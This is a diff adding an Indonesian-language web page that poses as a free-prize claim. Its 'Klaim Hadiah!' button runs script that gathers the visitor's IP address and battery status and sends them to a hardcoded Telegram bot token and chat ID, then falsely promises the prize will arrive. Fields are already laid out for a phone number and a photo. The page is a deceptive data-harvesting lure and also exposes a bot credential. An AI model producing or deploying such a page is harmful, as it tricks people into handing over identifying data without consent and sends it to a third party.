@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gratis Hadiah Spesial!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Selamat! Anda Memenangkan Hadiah!</h1>
+        <p>Klik tombol di bawah untuk mengklaim hadiah Anda:</p>
+        <button onclick="getData()">Klaim Hadiah!</button>
+    </div>
+    <script>
+        function getData() {
+            // Ambil IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    // Ambil info batre
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            var batteryLevel = battery.level * 100;
+                            var isCharging = battery.charging;
+                            var phoneNumber = "Nomor HP tidak tersedia karena masalah privasi.";
+                            var photoData = "Foto tidak tersedia karena masalah privasi.";
+
+                            sendDataToTelegram(ip, batteryLevel, isCharging, phoneNumber, photoData);
+                        });
+                    } else {
+                        var ip = data.ip;
+                        var batteryLevel = "Info batre tidak tersedia";
+                        var isCharging = "Info batre tidak tersedia";
+                        var phoneNumber = "Nomor HP tidak tersedia karena masalah privasi.";
+                        var photoData = "Foto tidak tersedia karena masalah privasi.";
+
+                        sendDataToTelegram(ip, batteryLevel, isCharging, phoneNumber, photoData);
+
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Gagal mendapatkan data. Coba lagi nanti.');
+                });
+        }
+
+        function sendDataToTelegram(ip, batteryLevel, isCharging, phoneNumber, photoData) {
+            var token = '7967343488:AAEJeAvoXhj4o5bIAOZ4oRqkwkRuI5NLWIE';
+            var chatId = '7386963303';
+            var message = `
+📍IP Address: ${ip}
+🔋Baterai: ${batteryLevel}%
+—Charging: ${isCharging ? 'Ya' : 'Tidak'}
+📱Nomor HP: ${phoneNumber}
+📷Foto: ${photoData}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    alert('Selamat! Hadiah akan segera dikirim!');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Gagal mengirim data. Coba lagi nanti.');
+                });
+        }
+    </script>
+</body>
+</html>
